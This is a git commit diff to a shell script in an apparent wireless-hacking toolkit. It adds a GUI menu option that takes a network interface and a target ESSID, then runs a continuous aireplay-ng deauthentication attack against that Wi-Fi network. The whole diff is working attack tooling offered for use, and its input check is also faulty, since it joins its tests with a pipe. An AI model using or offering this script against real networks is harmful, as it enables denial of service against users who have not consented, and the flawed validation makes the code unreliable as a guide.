c32378ea1e9f49cd20e82408994fd669d3d2a586
mikhailsimon <mikhailsimon0705@gmail.com>
2023-04-15 21:55:40 +0800

    new deauth attack

--- commands/wirelesshack/deauth/deauth.sh
+++ commands/wirelesshack/deauth/deauth.sh
@@ -1,4 +1,4 @@
-prompt1=$(zenity --list --title="Wireless Hacking" --column="Deauth Attack" "Injection Test" --width=300 --height=300)
+prompt1=$(zenity --list --title="Wireless Hacking" --column="Deauth Attack" "Injection Test" "Deauth" --width=300 --height=300)
 
 check_adapter() {
 iwconfig | zenity --text-info --title="Available Adapter List" --width=500 --height=300
@@ -14,4 +14,17 @@ then
      exit 1
   fi
  gnome-terminal -- sudo aireplay-ng -9 $wlan
+fi
+
+if [ "$prompt1" == "Deauth" ]
+then
+ check_adapter
+ wlan=$(ip -o link show | awk -F': ' '{print $2}' | zenity --list --title="Network Interfaces" --column="Interface Name")
+ essid=$(zenity --entry --title="ESSID" --text="ESSID:" --width=300)
+  if [ -z "$wlan" ] | [ -z "$essid" ]
+   then
+     zenity --info --title="Error" --text="Please insert input"
+     exit 1
+  fi
+ zenity --info --title="Deauth" --text="Deauthing..." | gnome-terminal -- sudo aireplay-ng --deauth 0 -e "$essid" "$wlan"
 fi
